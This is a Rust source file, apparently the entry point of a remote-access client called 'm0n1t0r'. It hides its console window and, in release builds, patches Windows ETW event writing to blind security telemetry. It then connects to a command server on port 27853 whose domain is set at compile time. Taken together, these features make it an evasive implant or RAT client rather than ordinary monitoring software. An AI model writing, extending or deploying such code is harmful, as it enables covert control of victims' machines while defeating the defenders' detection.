#![windows_subsystem = "windows"]

use anyhow::Result;
use flexi_logger::Logger;
use m0n1t0r_client::Config;
use std::{collections::HashMap, sync::Arc};
use tokio::sync::RwLock;

#[cfg(not(debug_assertions))]
async fn init() -> Result<()> {
    use anyhow::bail;
    use std::time::Duration;
    use tokio::time;

    #[cfg(target_os = "windows")]
    m0n1t0r_client::client::windows::blind::patch_etw_event_write().await?;

    if !m0n1t0r_client::init().await? {
        time::sleep(Duration::from_secs(60)).await;
        bail!("initialization failed");
    }

    Ok(())
}

#[tokio::main]
async fn main() -> Result<()> {
    Logger::try_with_str("info")?.start()?;
    #[cfg(not(debug_assertions))]
    init().await?;

    let client_map = Arc::new(RwLock::new(HashMap::new()));
    #[cfg(debug_assertions)]
    let config = Config::new("127.0.0.1", 27853);
    #[cfg(not(debug_assertions))]
    let config = Config::new(env!("M0N1T0R_DOMAIN"), 27853);

    m0n1t0r_client::run(&config, client_map).await?;
    Ok(())
}
